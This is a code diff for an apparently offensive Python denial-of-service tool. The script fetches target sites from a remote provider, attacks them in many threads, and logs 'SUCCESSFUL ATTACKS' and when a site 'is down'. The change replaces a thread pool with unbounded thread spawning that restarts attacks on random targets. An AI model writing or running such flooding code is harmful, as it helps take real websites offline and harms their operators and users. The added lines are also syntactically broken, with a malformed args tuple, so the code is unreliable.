@@ -3,7 +3,6 @@ import os
 import platform
 
 from argparse import ArgumentParser
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from gc import collect
 from os import system
 from sys import stderr
@@ -40,7 +39,6 @@ proxy_view = args.proxy_view
 
 remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
-executor = ThreadPoolExecutor(max_workers=threads)
 
 logger.remove()
 logger.add(
@@ -102,16 +100,16 @@ def mainth(site: str):
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
         logger.info("re-using thread for a new attack")
-        mainth(choice(remoteProvider.get_target_sites()))
+        Thread(target=mainth, args=(choice(remoteProvider.get_target_sites())).start()
     except ConnectionError as exc:
         logger.success(f"{site} is down")
         # when thread is about to finish, just re-start its task
         logger.info("re-using thread for a new attack")
-        mainth(choice(remoteProvider.get_target_sites()))
+        Thread(target=mainth, args=(choice(remoteProvider.get_target_sites())).start()
     except Exception as exc:
         logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
         logger.info("re-using thread for a new attack")
-        mainth(choice(remoteProvider.get_target_sites()))
+        Thread(target=mainth, args=(choice(remoteProvider.get_target_sites())).start()
 
 def clear():
     if platform.system() == "Linux":
@@ -137,4 +135,4 @@ if __name__ == '__main__':
     sites = remoteProvider.get_target_sites()
     # initially start as many tasks as configured threads
     for _ in range(threads):
-        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
+        Thread(target=mainth, args=(choice(remoteProvider.get_target_sites())).start()
